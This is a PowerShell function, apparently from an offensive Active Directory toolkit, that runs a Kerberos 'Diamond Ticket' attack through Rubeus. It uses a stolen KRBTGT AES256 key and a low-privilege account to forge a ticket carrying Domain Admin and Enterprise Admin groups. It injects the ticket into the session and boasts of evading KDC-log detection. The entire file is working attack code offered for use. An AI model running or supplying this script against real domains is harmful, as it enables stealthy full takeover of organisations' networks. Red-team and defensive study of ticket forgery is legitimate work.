function Invoke-DiamondTicket {
    <#
    .SYNOPSIS
        Execute a Diamond Ticket attack — the stealthiest ticket forge.

    .DESCRIPTION
        Requests a real TGT from the KDC (creating a valid AS-REQ/AS-REP
        log entry), then decrypts it with the KRBTGT AES256 key, modifies
        the PAC to add privileged group memberships, and re-encrypts.

        This is significantly harder to detect than Golden Tickets because
        the ticket has a legitimate issuance event in KDC logs.

        Requires Rubeus.exe — no Mimikatz equivalent exists.

    .PARAMETER KrbtgtAES256
        KRBTGT AES256 key (from DCSync).

    .PARAMETER LowPrivUser
        Valid low-privilege username for the initial real TGT request.

    .PARAMETER LowPrivPassword
        Password for the low-privilege account.

    .PARAMETER Domain
        Target domain. Defaults to current domain.

    .PARAMETER DC
        Domain controller hostname. Defaults to current DC.

    .PARAMETER Groups
        Comma-separated group RIDs to inject. Defaults to "512,519" (DA + EA).

    .EXAMPLE
        Invoke-DiamondTicket -KrbtgtAES256 "aes256key..." `
            -LowPrivUser jsmith -LowPrivPassword "Password1"
    #>

    param(
        [Parameter(Mandatory)][string]$KrbtgtAES256,
        [Parameter(Mandatory)][string]$LowPrivUser,
        [Parameter(Mandatory)][string]$LowPrivPassword,
        [string]$Domain = (Get-ADDomain).DNSRoot,
        [string]$DC = (Get-ADDomainController).HostName,
        [string]$Groups = "512,519"
    )

    Write-Host "`n[*] Diamond Ticket (Stealthy Golden Ticket)" -ForegroundColor Cyan
    Write-Host "[*] Step 1: Request real TGT as $LowPrivUser" -ForegroundColor Yellow
    Write-Host "[*] Step 2: Decrypt → Modify PAC → Re-encrypt" -ForegroundColor Yellow
    Write-Host "[*] Step 3: Inject modified ticket" -ForegroundColor Yellow

    if (Test-Path ".\Rubeus.exe") {
        & .\Rubeus.exe diamond /krbkey:$KrbtgtAES256 /user:$LowPrivUser `
            /password:$LowPrivPassword /enctype:aes /domain:$Domain `
            /dc:$DC /groups:$Groups /ptt
    }
    else {
        Write-Host "[-] Rubeus required for Diamond Tickets" -ForegroundColor Red
    }

    Write-Host "`n[+] Diamond Ticket injected. Stealth level: MAXIMUM" -ForegroundColor Green
}